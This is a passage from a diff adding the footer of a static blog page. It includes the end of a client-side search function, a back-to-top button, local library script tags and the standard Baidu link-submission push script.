+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
 
 </body>
+
 </html>
